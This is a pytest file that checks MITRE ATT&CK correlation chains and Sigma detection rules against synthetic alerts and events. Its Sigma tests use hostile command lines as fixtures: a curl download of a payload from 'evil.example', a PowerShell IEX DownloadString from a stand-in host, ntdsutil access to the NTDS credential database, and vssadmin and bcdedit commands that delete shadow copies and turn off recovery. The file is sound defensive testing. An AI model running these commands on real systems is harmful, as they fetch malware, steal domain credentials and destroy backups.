"""Tests for the MITRE ATT&CK detection library expansion.

Verifies the new declarative correlation chains (backend/detection/
correlation_rules/) and the new Sigma rules (sigma_rules/baraq/) against
synthetic alerts and events, reading the real on-disk rule files.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path

import yaml

from backend.database.models import Alert, NormalizedEvent
from backend.detection.correlation_engine import CorrelationEngine, load_correlation_rules
from backend.detection.sigma.engine import SigmaRuleEngine
from backend.detection.sigma.parser import parse_rule

CORRELATION_DIR = Path(__file__).resolve().parent.parent / "backend" / "detection" / "correlation_rules"
SIGMA_DIR = Path(__file__).resolve().parent.parent / "sigma_rules" / "baraq"

NEW_CORRELATIONS = [
    "initial_access_execution_chain",
    "persistence_credential_chain",
    "discovery_lateral_chain",
    "collection_exfiltration_chain",
    "defense_evasion_impact_chain",
    "c2_download_beacon_chain",
    "credential_exploit_events",
]

NEW_SIGMA = [
    "baraq_curl_wget_temp_download.yml",
    "baraq_iex_downloadstring.yml",
    "baraq_ntds_dit_access.yml",
    "baraq_vssadmin_delete_shadows.yml",
    "baraq_bcdedit_recovery_disabled.yml",
    "baraq_remote_access_tool_install.yml",
]


def _mk_alert(db, rule, tactic, host="WS-01", minutes_ago=1):
    alert = Alert(
        name=f"{rule} alert",
        rule=rule,
        mitre_id="T0000",
        mitre_tactic=tactic,
        host=host,
        severity="high",
        status="open",
        confidence=0.8,
        score=50,
        risk_score=50,
        risk_level="MEDIUM",
        evidence=f"host '{host}' user 'bob'",
        detection_method="rule",
        org="",
        created_at=datetime.now(timezone.utc) - timedelta(minutes=minutes_ago),
    )
    db.add(alert)
    db.commit()
    return alert


def _mk_events(db, event_id=4625, host="WS-01", risk="Medium", count=5, minutes_ago=1):
    for _ in range(count):
        db.add(
            NormalizedEvent(
                event_id=event_id,
                category="Authentication",
                source="windows",
                user="bob",
                host=host,
                org="",
                risk=risk,
                severity="medium",
                message="failed logon",
                timestamp=datetime.now(timezone.utc) - timedelta(minutes=minutes_ago),
                raw_json={"channel": "Security", "facts": {"EventID": event_id}},
            )
        )
    db.commit()


def _correlation_engine(db, names: list[str]) -> CorrelationEngine:
    engine = CorrelationEngine(db)
    engine.specs = [s for s in load_correlation_rules() if s.name in names]
    return engine


def _mk_sigma_event(db, event_id=4688, facts=None, minutes_ago=1):
    db.add(
        NormalizedEvent(
            event_id=event_id,
            category="Process Creation",
            source="windows",
            user="bob",
            host="WS-01",
            risk="Low",
            severity="info",
            message="",
            timestamp=datetime.now(timezone.utc) - timedelta(minutes=minutes_ago),
            raw_json={"channel": "Security", "facts": facts or {"CommandLine": ""}},
        )
    )
    db.commit()


# ---------------------------------------------------------------------------
# correlation chains
# ---------------------------------------------------------------------------
def test_all_correlation_rules_parse():
    specs = load_correlation_rules()
    names = [s.name for s in specs]
    assert len(specs) == 11
    for name in NEW_CORRELATIONS:
        assert name in names


def test_initial_access_chain(db):
    _mk_alert(db, "email_phishing", "Initial Access")
    _mk_alert(db, "suspicious_powershell", "Execution")
    engine = _correlation_engine(db, ["initial_access_execution_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1566"
    assert findings[0].severity == "critical"


def test_persistence_credential_chain(db):
    _mk_alert(db, "persistence", "Persistence")
    _mk_alert(db, "lsass_dump", "Credential Access")
    engine = _correlation_engine(db, ["persistence_credential_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1003"


def test_discovery_lateral_chain(db):
    _mk_alert(db, "account_discovery", "Discovery")
    _mk_alert(db, "rdp_lateral", "Lateral Movement")
    engine = _correlation_engine(db, ["discovery_lateral_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1021"


def test_collection_exfiltration_chain(db):
    _mk_alert(db, "data_staging", "Collection")
    _mk_alert(db, "exfil_web", "Exfiltration")
    engine = _correlation_engine(db, ["collection_exfiltration_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1048"


def test_defense_evasion_impact_chain(db):
    _mk_alert(db, "disable_defender", "Defense Evasion")
    _mk_alert(db, "ransomware_impact", "Impact")
    engine = _correlation_engine(db, ["defense_evasion_impact_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1486"


def test_c2_download_beacon_chain(db):
    _mk_alert(db, "suspicious_powershell", "Execution")
    _mk_alert(db, "c2_beacon", "Command and Control")
    engine = _correlation_engine(db, ["c2_download_beacon_chain"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1071"


def test_credential_exploit_events_multi_source(db):
    _mk_events(db, event_id=4625, count=5, risk="Medium")
    _mk_alert(db, "kerberoast", "Credential Access")
    engine = _correlation_engine(db, ["credential_exploit_events"])
    findings = engine.evaluate(window_minutes=60)
    assert len(findings) == 1
    assert findings[0].mitre_id == "T1003"
    assert "event_ids=[4625]" in findings[0].evidence
    assert "alert_ids=" in findings[0].evidence


def test_correlation_chain_requires_all_stages(db):
    _mk_alert(db, "email_phishing", "Initial Access")
    engine = _correlation_engine(db, ["initial_access_execution_chain"])
    assert engine.evaluate(window_minutes=60) == []


def test_correlation_chain_scoped_per_host(db):
    _mk_alert(db, "email_phishing", "Initial Access", host="WS-01")
    _mk_alert(db, "suspicious_powershell", "Execution", host="WS-02")
    engine = _correlation_engine(db, ["initial_access_execution_chain"])
    assert engine.evaluate(window_minutes=60) == []


def test_event_stage_min_count_not_reached(db):
    _mk_events(db, event_id=4625, count=4, risk="Medium")
    _mk_alert(db, "kerberoast", "Credential Access")
    engine = _correlation_engine(db, ["credential_exploit_events"])
    assert engine.evaluate(window_minutes=60) == []


# ---------------------------------------------------------------------------
# sigma rules
# ---------------------------------------------------------------------------
def test_all_new_sigma_rules_parse():
    for filename in NEW_SIGMA:
        raw = yaml.safe_load((SIGMA_DIR / filename).read_text(encoding="utf-8"))
        rule = parse_rule(raw, filename)
        assert rule is not None, filename
        assert rule.title and rule.severity


def _new_sigma_engine(db, tmp_path):
    rules_dir = tmp_path / "sigma_new"
    rules_dir.mkdir()
    for filename in NEW_SIGMA:
        (rules_dir / filename).write_text(
            (SIGMA_DIR / filename).read_text(encoding="utf-8"), encoding="utf-8"
        )
    return SigmaRuleEngine(db, rules_dir=rules_dir)


def test_sigma_curl_wget_temp_download(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "curl -o C:\\temp\\payload.exe http://evil.example/x"})
    results = engine.evaluate(10)
    assert any(r.mitre_id == "T1105" for r in results)


def test_sigma_iex_downloadstring(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(
        db,
        event_id=4104,
        facts={"ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/x')"},
    )
    results = engine.evaluate(10)
    assert any(r.mitre_id == "T1059.001" for r in results)


def test_sigma_ntds_dit_access(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "ntdsutil \"ac i ntds\" \"q q\""})
    results = engine.evaluate(10)
    assert any(r.severity == "critical" and "NTDS" in r.name for r in results)


def test_sigma_vssadmin_delete_shadows(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "vssadmin delete shadows /all /quiet"})
    results = engine.evaluate(10)
    assert any(r.severity == "critical" and "Shadow" in r.name for r in results)


def test_sigma_bcdedit_recovery_disabled(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "bcdedit /set recoveryenabled no"})
    results = engine.evaluate(10)
    assert any("Recovery" in r.name for r in results)


def test_sigma_remote_access_tool_install(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "C:\\Users\\bob\\Downloads\\TeamViewer_Setup_x64.exe"})
    results = engine.evaluate(10)
    assert any(r.mitre_id == "T1219" for r in results)


def test_sigma_rules_do_not_fire_on_benign(db, tmp_path):
    engine = _new_sigma_engine(db, tmp_path)
    _mk_sigma_event(db, facts={"CommandLine": "notepad.exe C:\\docs\\notes.txt"})
    _mk_sigma_event(db, event_id=4104, facts={"ScriptBlockText": "Get-Date"})
    assert engine.evaluate(10) == []